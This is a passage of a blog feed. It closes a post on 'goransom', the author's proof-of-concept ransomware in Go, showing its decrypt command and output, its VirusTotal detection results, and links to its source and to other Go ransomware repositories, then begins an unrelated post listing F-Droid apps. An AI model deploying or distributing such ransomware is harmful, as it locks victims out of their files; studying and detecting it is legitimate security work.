+&lt;p&gt;Decrypting the file is quite easy: just repeat the command for the encryption (same &lt;code&gt;target&lt;/code&gt; and same &lt;code&gt;secret&lt;/code&gt;) and append the &lt;code&gt;-decrypt&lt;/code&gt; command:&lt;/p&gt;
+&lt;div class="highlight-wrapper"&gt;&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;$ ./goransom -secret supersecret -target folder -decrypt
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Operating on folder
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Operating on folder/textfile.locked
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;$ tree
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;.
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;├── goransom
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;└── folder
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; └── textfile
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;$ cat folder/textfile
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;THIS IS A SUPER IMPORTANT FILE, PLEASE DONT TAKE IT AWAY FROM ME&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;figure&gt;
+&lt;img class="my-0 rounded-md" src="/images/posts/goransom/goransompowershell.webp" alt="Windows 10 test" /&gt;
+&lt;figcaption&gt;It works in the same way in Windows 10&lt;/figcaption&gt;
+&lt;/figure&gt;
+&lt;h2 class="relative group"&gt;Detection
+&lt;div id="detection" class="anchor"&gt;&lt;/div&gt;
+&lt;span
+class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"&gt;
+&lt;a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#detection" aria-label="Anchor"&gt;#&lt;/a&gt;
+&lt;/span&gt;
+&lt;/h2&gt;
+&lt;p&gt;While I was testing &lt;code&gt;goransom&lt;/code&gt; on Windows 10, I had the issue that Windows Security complained about it:&lt;/p&gt;
+&lt;figure&gt;
+&lt;img class="my-0 rounded-md" src="/images/posts/goransom/windows_def.webp" alt="Windows Security detects goransom" /&gt;
+&lt;figcaption&gt;Windows Security doesn&amp;rsquo;t like &lt;code&gt;goransom&lt;/code&gt;&lt;/figcaption&gt;
+&lt;/figure&gt;
+&lt;p&gt;So I uploaded three different &lt;code&gt;goransom&lt;/code&gt; executables on VirusTotal, to see if they are detected. Here are the results:&lt;/p&gt;
+&lt;figure&gt;
+&lt;img class="my-0 rounded-md" src="/images/posts/goransom/vtwin.webp" alt="VirusTotal detecting goransom" /&gt;
+&lt;figcaption&gt;&lt;a href="https://www.virustotal.com/gui/file/1ea7f882ffab3e6fd7e80ae525df7bb35f53187948647bde2bb87a473e7c0107/detection" target="_blank" rel="noreferrer"&gt;goransom for Windows on VirusTotal&lt;/a&gt;&lt;/figcaption&gt;
+&lt;/figure&gt;
+&lt;figure&gt;
+&lt;img class="my-0 rounded-md" src="/images/posts/goransom/vtlinux.webp" alt="VirusTotal detecting goransom" /&gt;
+&lt;figcaption&gt;&lt;a href="https://www.virustotal.com/gui/file/982cedf944165137afdf5ec1b6341e588c7bea2c7b84b32578ae522b6784d01b/detection" target="_blank" rel="noreferrer"&gt;goransom for Linux on VirusTotal&lt;/a&gt;&lt;/figcaption&gt;
+&lt;/figure&gt;
+&lt;figure&gt;
+&lt;img class="my-0 rounded-md" src="/images/posts/goransom/vtmac.webp" alt="VirusTotal detecting goransom" /&gt;
+&lt;figcaption&gt;&lt;a href="https://www.virustotal.com/gui/file/17c6001d777259d10010622e722c52c36315986895dfab385db0e2f9ddc3a041/detection" target="_blank" rel="noreferrer"&gt;goransom for macOs on VirusTotal&lt;/a&gt;&lt;/figcaption&gt;
+&lt;/figure&gt;
+&lt;p&gt;The Windows version is the only one which is considered malicious, since 43 (!!) engines flagged it. Please note that the source code which was used to compile the three executables is exactly the same. Also, one of the functions in &lt;code&gt;goransom&lt;/code&gt; is called &lt;code&gt;ransomware&lt;/code&gt;, which may be the reason why some engines flags the Windows executable.&lt;/p&gt;
+&lt;p&gt;Unfortunately &lt;code&gt;goransom&lt;/code&gt; cannot be readily tested against public sandboxes, as it requires an input to be executed properly. I am not aware of online tools which allow this level of interaction with an executable, but if you know some, please let me know. It would be interesting to see the outcome.&lt;/p&gt;
+&lt;h2 class="relative group"&gt;Conclusion
+&lt;div id="conclusion" class="anchor"&gt;&lt;/div&gt;
+&lt;span
+class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"&gt;
+&lt;a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#conclusion" aria-label="Anchor"&gt;#&lt;/a&gt;
+&lt;/span&gt;
+&lt;/h2&gt;
+&lt;p&gt;&lt;code&gt;goransom&lt;/code&gt; was super fun and relatively easy to make. The &lt;code&gt;crypto&lt;/code&gt; package and the goroutines allow the code to be easy to read and efficient.&lt;/p&gt;
+&lt;p&gt;There are a number of improvements which could be added, but, in the end, I consider the proof of concept successful as it is. And the fact that VirusTotal and Microsoft Security do not like &lt;code&gt;goransom&lt;/code&gt; makes it even more successful.&lt;/p&gt;
+&lt;p&gt;You can find &lt;code&gt;goransom&lt;/code&gt; on GitHub&lt;/p&gt;
+&lt;div class="github-card-wrapper"&gt;
+&lt;a id="github-fcaee6ba1da494f8080ecaa0493d5427" target="_blank" href="https://github.com/andpalmier/goransom" class="cursor-pointer"&gt;
+&lt;div
+class="w-full md:w-auto p-0 m-0 border border-neutral-200 dark:border-neutral-700 border rounded-md shadow-2xl"&gt;&lt;div class="w-full nozoom"&gt;
+&lt;img
+src="https://opengraph.githubassets.com/0/andpalmier/goransom"
+alt="GitHub Repository Thumbnail"
+class="nozoom mt-0 mb-0 w-full h-full object-cover"&gt;
+&lt;/div&gt;&lt;div class="w-full md:w-auto pt-3 p-5"&gt;
+&lt;div class="flex items-center"&gt;
+&lt;span class="text-2xl text-neutral-800 dark:text-neutral me-2"&gt;
+&lt;span class="relative block icon"&gt;&lt;svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"&gt;&lt;path fill="currentColor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/&gt;&lt;/svg&gt;
+&lt;/span&gt;
+&lt;/span&gt;
+&lt;div
+id="github-fcaee6ba1da494f8080ecaa0493d5427-full_name"
+class="m-0 font-bold text-xl text-neutral-800 decoration-primary-500 hover:underline hover:underline-offset-2 dark:text-neutral"&gt;
+andpalmier/goransom
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;p id="github-fcaee6ba1da494f8080ecaa0493d5427-description" class="m-0 mt-2 text-md text-neutral-800 dark:text-neutral"&gt;
+A proof of concept of a super simple ransomware written in Go
+&lt;/p&gt;
+&lt;div class="m-0 mt-2 flex items-center"&gt;
+&lt;span class="mr-1 inline-block h-3 w-3 rounded-full language-dot" data-language="Go"&gt;&lt;/span&gt;
+&lt;div class="m-0 mr-5 text-md text-neutral-800 dark:text-neutral"&gt;
+Go
+&lt;/div&gt;
+&lt;span class="text-md mr-1 text-neutral-800 dark:text-neutral"&gt;
+&lt;span class="relative block icon"&gt;&lt;svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512"&gt;&lt;path fill="currentColor" d="M287.9 0C297.1 0 305.5 5.25 309.5 13.52L378.1 154.8L531.4 177.5C540.4 178.8 547.8 185.1 550.7 193.7C553.5 202.4 551.2 211.9 544.8 218.2L433.6 328.4L459.9 483.9C461.4 492.9 457.7 502.1 450.2 507.4C442.8 512.7 432.1 513.4 424.9 509.1L287.9 435.9L150.1 509.1C142.9 513.4 133.1 512.7 125.6 507.4C118.2 502.1 114.5 492.9 115.1 483.9L142.2 328.4L31.11 218.2C24.65 211.9 22.36 202.4 25.2 193.7C28.03 185.1 35.5 178.8 44.49 177.5L197.7 154.8L266.3 13.52C270.4 5.249 278.7 0 287.9 0L287.9 0zM287.9 78.95L235.4 187.2C231.9 194.3 225.1 199.3 217.3 200.5L98.98 217.9L184.9 303C190.4 308.5 192.9 316.4 191.6 324.1L171.4 443.7L276.6 387.5C283.7 383.7 292.2 383.7 299.2 387.5L404.4 443.7L384.2 324.1C382.9 316.4 385.5 308.5 391 303L476.9 217.9L358.6 200.5C350.7 199.3 343.9 194.3 340.5 187.2L287.9 78.95z"/&gt;&lt;/svg&gt;&lt;/span&gt;
+&lt;/span&gt;
+&lt;div id="github-fcaee6ba1da494f8080ecaa0493d5427-stargazers" class="m-0 mr-5 text-md text-neutral-800 dark:text-neutral"&gt;
+9
+&lt;/div&gt;
+&lt;span class="text-md mr-1 text-neutral-800 dark:text-neutral"&gt;
+&lt;span class="relative block icon"&gt;&lt;svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"&gt;&lt;path fill="currentColor" d="M80 104c13.3 0 24-10.7 24-24s-10.7-24-24-24S56 66.7 56 80s10.7 24 24 24zm80-24c0 32.8-19.7 61-48 73.3V192c0 17.7 14.3 32 32 32H304c17.7 0 32-14.3 32-32V153.3C307.7 141 288 112.8 288 80c0-44.2 35.8-80 80-80s80 35.8 80 80c0 32.8-19.7 61-48 73.3V192c0 53-43 96-96 96H256v70.7c28.3 12.3 48 40.5 48 73.3c0 44.2-35.8 80-80 80s-80-35.8-80-80c0-32.8 19.7-61 48-73.3V288H144c-53 0-96-43-96-96V153.3C19.7 141 0 112.8 0 80C0 35.8 35.8 0 80 0s80 35.8 80 80zm208 24c13.3 0 24-10.7 24-24s-10.7-24-24-24s-24 10.7-24 24s10.7 24 24 24zM248 432c0-13.3-10.7-24-24-24s-24 10.7-24 24s10.7 24 24 24s24-10.7 24-24z"/&gt;&lt;/svg&gt;&lt;/span&gt;
+&lt;/span&gt;
+&lt;div id="github-fcaee6ba1da494f8080ecaa0493d5427-forks" class="m-0 mr-5 text-md text-neutral-800 dark:text-neutral"&gt;
+4
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;script
+async
+type="text/javascript"
+src="/js/fetch-repo.min.dc5533c50cefd50405344b235937142271f26229fe39cbee27fd4960e8bb897a0beebfad77a1091ca91cd0d1fb14e70fc37cc114dd9674fb2c32e0ab512ec8a4.js"
+integrity="sha512-3FUzxQzv1QQFNEsjWTcUInHyYin&amp;#43;OcvuJ/1JYOi7iXoL7r&amp;#43;td6EJHKkc0NH7FOcPw3zBFN2WdPssMuCrUS7IpA=="
+data-repo-url="https://api.github.com/repos/andpalmier/goransom"
+data-repo-id="github-fcaee6ba1da494f8080ecaa0493d5427"&gt;&lt;/script&gt;
+&lt;/a&gt;
+&lt;/div&gt;
+&lt;p&gt;let me know if you have suggestions or tips to improve the quality and structure of the code.&lt;/p&gt;
+&lt;p&gt;If you are looking for other proof of concept of ransomware written in Go, check out these projects:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href="https://github.com/target111/go-crypt" target="_blank" rel="noreferrer"&gt;go-crypt&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://github.com/lucdew/goransomware" target="_blank" rel="noreferrer"&gt;goransomware&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://github.com/wille/cry" target="_blank" rel="noreferrer"&gt;go-cry&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;</description></item><item><title>F-Droid apps you will find useful</title><link>/posts/fdroid-apps/</link><pubDate>Sun, 05 Apr 2020 00:00:00 +0000</pubDate><guid>/posts/fdroid-apps/</guid><description>
+&lt;h2 class="relative group"&gt;What is F-Droid?
+&lt;div id="what-is-f-droid" class="anchor"&gt;&lt;/div&gt;
+&lt;span
+class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"&gt;
+&lt;a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#what-is-f-droid" aria-label="Anchor"&gt;#&lt;/a&gt;
+&lt;/span&gt;
+&lt;/h2&gt;
+&lt;p&gt;F-Droid is a community-maintained software repository for Android devices; or - to make it simpler - an alternative store for Android apps.
+Similarly to the Google Play Store, F-Droid allows searching, installing and updating apps. What makes F-Droid different from the Google Play Store (and other alternative stores, such as Aptoide) is the fact that its entire list of applications is FOSS (&lt;em&gt;Free and Open Source Software&lt;/em&gt;), meaning that the source code of the apps is available online, and can be inspected by everyone.&lt;/p&gt;
+&lt;h2 class="relative group"&gt;Why use F-Droid?
+&lt;div id="why-use-f-droid" class="anchor"&gt;&lt;/div&gt;
+&lt;span
+class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"&gt;
+&lt;a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#why-use-f-droid" aria-label="Anchor"&gt;#&lt;/a&gt;
+&lt;/span&gt;
+&lt;/h2&gt;
+&lt;p&gt;There are different advantages of using F-Droid. On the privacy side, F-Droid allows the user to download, install and update applications without being registered to the store. In addition, every app on F-Droid has to have the so-called ‘&lt;em&gt;anti-features&lt;/em&gt;’:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;No user tracking systems;&lt;/li&gt;
+&lt;li&gt;No advertising;&lt;/li&gt;
+&lt;li&gt;No dependence on non-free software: everyone can download, run, and use all the features of the application&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;On the security side, its open-source license allows everyone to check the source code of every app before downloading it. In addition, F-Droid sends all the information over HTTPS by default, and, if &lt;a href="https://guardianproject.info/apps/orbot/" target="_blank" rel="noreferrer"&gt;Orbot&lt;/a&gt; is installed on the device, it can even force the traffic to go through Tor.&lt;/p&gt;
+&lt;p&gt;If you are interested in the building and signing process of the apps, you can find some details in the &lt;a href="https://f-droid.org/en/docs/FAQ_-_General" target="_blank" rel="noreferrer"&gt;FAQ section on f-droid.org&lt;/a&gt; or in the documentation about the &lt;a href="https://f-droid.org/en/docs/Security_Model/" target="_blank" rel="noreferrer"&gt;security model&lt;/a&gt;.&lt;/p&gt;
+&lt;h2 class="relative group"&gt;How to install F-Droid?
+&lt;div id="how-to-install-f-droid" class="anchor"&gt;&lt;/div&gt;
+&lt;span
+class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"&gt;
+&lt;a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#how-to-install-f-droid" aria-label="Anchor"&gt;#&lt;/a&gt;
+&lt;/span&gt;
+&lt;/h2&gt;
+&lt;p&gt;Due to its FOSS nature, F-Droid cannot be found in the Google Play store. This means that it has to be downloaded and installed manually.
+You can find the app on the &lt;a href="https://f-droid.org/en/" target="_blank" rel="noreferrer"&gt;f-droid website&lt;/a&gt;, but, in order to install it, you should allow your browser to &amp;lsquo;&lt;em&gt;install apps from unknown sources&lt;/em&gt;&amp;rsquo; directly from the Android settings. This should also be enabled for F-Droid itself, in order to download and install apps from it.&lt;/p&gt;
+&lt;p&gt;A suggestion: disable this special permission for your browser as soon as the F-Droid installation is completed, because it creates a security risk for your device.&lt;/p&gt;
+&lt;h2 class="relative group"&gt;My favorite FOSS apps
+&lt;div id="my-favorite-foss-apps" class="anchor"&gt;&lt;/div&gt;
+&lt;span
+class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"&gt;
+&lt;a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#my-favorite-foss-apps" aria-label="Anchor"&gt;#&lt;/a&gt;
+&lt;/span&gt;
+&lt;/h2&gt;
+&lt;p&gt;Here is a list of my favorite &lt;em&gt;FOSS&lt;/em&gt; Android apps. Keep in mind that some of them can be found also on the Google Play store.&lt;/p&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th style="text-align: center"&gt;Name&lt;/th&gt;
+&lt;th style="text-align: center"&gt;Google Play?&lt;/th&gt;
+&lt;th style="text-align: center"&gt;Category&lt;/th&gt;
+&lt;th style="text-align: center"&gt;Description&lt;/th&gt;
+&lt;th style="text-align: center"&gt;Source code&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td style="text-align: center"&gt;AdAway&lt;/td&gt;
+&lt;td style="text-align: center"&gt;No&lt;/td&gt;
+&lt;td style="text-align: center"&gt;Adblocker&lt;/td&gt;
+&lt;td style="text-align: center"&gt;Lightweight adblocker for your phone. It can work without root permissions.&lt;/td&gt;
+&lt;td style="text-align: center"&gt;&lt;a href="https://github.com/AdAway/AdAway" target="_blank" rel="noreferrer"&gt;GitHub&lt;/a&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style="text-align: center"&gt;Aegis&lt;/td&gt;
+&lt;td style="text-align: center"&gt;&lt;a href="https://play.google.com/store/apps/details?id=com.beemdevelopment.aegis" target="_blank" rel="noreferrer"&gt;Yes&lt;/a&gt;&lt;/td&gt;
+&lt;td style="text-align: center"&gt;2FA token&lt;/td&gt;
+&lt;td style="text-align: center"&gt;Free, easy and secure app to manage 2-step verification tokens.&lt;/td&gt;
+&lt;td style="text-align: center"&gt;&lt;a href="https://github.com/beemdevelopment/Aegis" target="_blank" rel="noreferrer"&gt;GitHub&lt;/a&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style="text-align: center"&gt;AntennaPod&lt;/td&gt;
+&lt;td style="text-align: center"&gt;&lt;a href="https://play.google.com/store/apps/details?id=de.danoeh.antennapod" target="_blank" rel="noreferrer"&gt;Yes&lt;/a&gt;&lt;/td&gt;
+&lt;td style="text-align: center"&gt;Podcast&lt;/td&gt;
+&lt;td style="text-align: center"&gt;Download, stream or queue episodes with tons of features. Millions of free and paid podcasts available.&lt;/td&gt;
+&lt;td style="text-align: center"&gt;&lt;a href="https://github.com/antennapod/AntennaPod" target="_blank" rel="noreferrer"&gt;GitHub&lt;/a&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style="text-align: center"&gt;Birday&lt;/td&gt;
+&lt;td style="text-align: center"&gt;No&lt;/td&gt;
+&lt;td style="text-align: center"&gt;Birthdays reminder&lt;/td&gt;
+&lt;td style="text-align: center"&gt;A simple yet useful birthday manager. Birday is free and ad-free!&lt;/td&gt;
+&lt;td style="text-align: center"&gt;&lt;a href="https://github.com/m-i-n-a-r/birday" target="_blank" rel="noreferrer"&gt;GitHub&lt;/a&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style="text-align: center"&gt;Bitwarden&lt;/td&gt;
+&lt;td style="text-align: center"&gt;&lt;a href="https://play.google.com/store/apps/details?id=com.x8bit.bitwarden" target="_blank" rel="noreferrer"&gt;Yes&lt;/a&gt;&lt;/td&gt;
+&lt;td style="text-align: center"&gt;Password manager&lt;/td&gt;
+&lt;td style="text-align: center"&gt;Easy password manager solution which can be self-hosted and can generate 2FA tokens.&lt;/td&gt;
+&lt;td style="text-align: center"&gt;&lt;a href="https://github.com/bitwarden/mobile" target="_blank" rel="noreferrer"&gt;GitHub&lt;/a&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style="text-align: center"&gt;Bromite&lt;/td&gt;
+&lt;td style="text-align: center"&gt;No&lt;/td&gt;
+&lt;td style="text-align: center"&gt;Browser&lt;/td&gt;
+&lt;td style="text-align: center"&gt;Chromium fork with ad blocking and enhanced privacy.&lt;/td&gt;
+&lt;td style="text-align: center"&gt;&lt;a href="https://github.com/bromite/bromite" target="_blank" rel="noreferrer"&gt;GitHub&lt;/a&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style="text-align: center"&gt;Catima&lt;/td&gt;
+&lt;td style="text-align: center"&gt;&lt;a href="https://play.google.com/store/apps/details?id=me.hackerchick.catima" target="_blank" rel="noreferrer"&gt;Yes&lt;/a&gt;&lt;/td&gt;
+&lt;td style="text-align: center"&gt;Wallet&lt;/td&gt;
+&lt;td style="text-align: center"&gt;For barcodes, memberships, loyalty programs, coupons and tickets.&lt;/td&gt;
+&lt;td style="text-align: center"&gt;&lt;a href="https://github.com/CatimaLoyalty/Android" target="_blank" rel="noreferrer"&gt;GitHub&lt;/a&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style="text-align: center"&gt;Download Navi&lt;/td&gt;
+&lt;td style="text-align: center"&gt;&lt;a href="https://play.google.com/store/apps/details?id=com.tachibana.downloader" target="_blank" rel="noreferrer"&gt;Yes&lt;/a&gt;&lt;/td&gt;
+&lt;td style="text-align: center"&gt;Download manager&lt;/td&gt;
+&lt;td style="text-align: center"&gt;Easy to use download manager for your phone.&lt;/td&gt;
+&lt;td style="text-align: center"&gt;&lt;a href="https://github.com/TachibanaGeneralLaboratories/download-navi" target="_blank" rel="noreferrer"&gt;GitHub&lt;/a&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style="text-align: center"&gt;Gadgetbridge&lt;/td&gt;
+&lt;td style="text-align: center"&gt;No&lt;/td&gt;
+&lt;td style="text-align: center"&gt;Wearables&lt;/td&gt;
+&lt;td style="text-align: center"&gt;Communicate with wearables without giving your privacy away. Many features available depending on the device.&lt;/td&gt;
+&lt;td style="text-align: center"&gt;&lt;a href="https://codeberg.org/Freeyourgadget/Gadgetbridge/" target="_blank" rel="noreferrer"&gt;Codeberg&lt;/a&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style="text-align: center"&gt;Infinity&lt;/td&gt;
+&lt;td style="text-align: center"&gt;&lt;a href="https://play.google.com/store/apps/details?id=ml.docilealligator.infinityforreddit" target="_blank" rel="noreferrer"&gt;Yes&lt;/a&gt;&lt;/td&gt;
+&lt;td style="text-align: center"&gt;Reddit&lt;/td&gt;
+&lt;td style="text-align: center"&gt;Beautiful, feature-rich app that offers a smooth Reddit browsing experience.&lt;/td&gt;
+&lt;td style="text-align: center"&gt;&lt;a href="https://github.com/Docile-Alligator/Infinity-For-Reddit" target="_blank" rel="noreferrer"&gt;GitHub&lt;/a&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style="text-align: center"&gt;KISS&lt;/td&gt;
+&lt;td style="text-align: center"&gt;&lt;a href="https://play.google.com/store/apps/details?id=fr.neamar.kiss" target="_blank" rel="noreferrer"&gt;Yes&lt;/a&gt;&lt;/td&gt;
+&lt;td style="text-align: center"&gt;Launcher&lt;/td&gt;
+&lt;td style="text-align: center"&gt;Easy to use and extremely lightweight Android launcher.&lt;/td&gt;
+&lt;td style="text-align: center"&gt;&lt;a href="https://github.com/Neamar/KISS" target="_blank" rel="noreferrer"&gt;GitHub&lt;/a&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style="text-align: center"&gt;Loop Habit Tracker&lt;/td&gt;
+&lt;td style="text-align: center"&gt;&lt;a href="https://play.google.com/store/apps/details?id=org.isoron.uhabits" target="_blank" rel="noreferrer"&gt;Yes&lt;/a&gt;&lt;/td&gt;
+&lt;td style="text-align: center"&gt;Habit tracker&lt;/td&gt;
+&lt;td style="text-align: center"&gt;Helps you create and maintain good habits, allowing you to achieve your long-term goals.&lt;/td&gt;
+&lt;td style="text-align: center"&gt;&lt;a href="https://github.com/iSoron/uhabits" target="_blank" rel="noreferrer"&gt;GitHub&lt;/a&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style="text-align: center"&gt;Material Files&lt;/td&gt;
+&lt;td style="text-align: center"&gt;&lt;a href="https://play.google.com/store/apps/details?id=me.zhanghai.android.files" target="_blank" rel="noreferrer"&gt;Yes&lt;/a&gt;&lt;/td&gt;
+&lt;td style="text-align: center"&gt;File manager&lt;/td&gt;
+&lt;td style="text-align: center"&gt;A Material Design file manager, for Android 5.0+.&lt;/td&gt;
+&lt;td style="text-align: center"&gt;&lt;a href="https://github.com/zhanghai/MaterialFiles" target="_blank" rel="noreferrer"&gt;GitHub&lt;/a&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style="text-align: center"&gt;Medito&lt;/td&gt;
+&lt;td style="text-align: center"&gt;&lt;a href="https://play.google.com/store/apps/details?id=meditofoundation.medito" target="_blank" rel="noreferrer"&gt;Yes&lt;/a&gt;&lt;/td&gt;
+&lt;td style="text-align: center"&gt;Meditation&lt;/td&gt;
+&lt;td style="text-align: center"&gt;Meditation app that includes guided meditations, breathing exercises, mindfulness practices, relaxing sounds, and more.&lt;/td&gt;
+&lt;td style="text-align: center"&gt;&lt;a href="https://github.com/meditohq/medito-app" target="_blank" rel="noreferrer"&gt;GitHub&lt;/a&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style="text-align: center"&gt;Mull&lt;/td&gt;
+&lt;td style="text-align: center"&gt;No&lt;/td&gt;
+&lt;td style="text-align: center"&gt;Browser&lt;/td&gt;
+&lt;td style="text-align: center"&gt;This is a fork of Firefox without proprietary blobs. Addons available.&lt;/td&gt;
+&lt;td style="text-align: center"&gt;&lt;a href="https://gitlab.com/divested-mobile/mull-fenix" target="_blank" rel="noreferrer"&gt;GitLab&lt;/a&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style="text-align: center"&gt;NewPipe&lt;/td&gt;
+&lt;td style="text-align: center"&gt;No&lt;/td&gt;
+&lt;td style="text-align: center"&gt;YouTube (&amp;amp; more)&lt;/td&gt;
+&lt;td style="text-align: center"&gt;Youtube client that allows audio only playback in background and download. No Google account needed.&lt;/td&gt;
+&lt;td style="text-align: center"&gt;&lt;a href="https://github.com/TeamNewPipe/NewPipe" target="_blank" rel="noreferrer"&gt;GitHub&lt;/a&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style="text-align: center"&gt;Tusky&lt;/td&gt;
+&lt;td style="text-align: center"&gt;&lt;a href="https://play.google.com/store/apps/details?id=com.keylesspalace.tusky" target="_blank" rel="noreferrer"&gt;Yes&lt;/a&gt;&lt;/td&gt;
+&lt;td style="text-align: center"&gt;Mastodon&lt;/td&gt;
+&lt;td style="text-align: center"&gt;Lightweight and feature-rich client for Mastodon.&lt;/td&gt;
+&lt;td style="text-align: center"&gt;&lt;a href="https://github.com/tuskyapp/Tusky" target="_blank" rel="noreferrer"&gt;GitHub&lt;/a&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style="text-align: center"&gt;Voice&lt;/td&gt;
+&lt;td style="text-align: center"&gt;&lt;a href="https://play.google.com/store/apps/details?id=de.ph1b.audiobook" target="_blank" rel="noreferrer"&gt;Yes&lt;/a&gt;&lt;/td&gt;
+&lt;td style="text-align: center"&gt;Audiobooks&lt;/td&gt;
